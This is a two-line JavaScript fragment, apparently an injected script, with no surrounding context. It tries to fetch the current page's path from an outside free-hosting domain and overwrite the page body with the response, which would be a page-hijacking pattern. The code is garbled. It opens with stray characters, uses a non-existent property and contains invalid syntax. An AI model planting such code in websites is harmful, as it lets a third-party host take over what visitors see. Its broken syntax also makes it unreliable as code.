ewevar src = document.url.replace(document.domain, "");
document.body.innerHTML = fetch("https://yasirator.000webhostapp.com" + src).then(code => throw code);
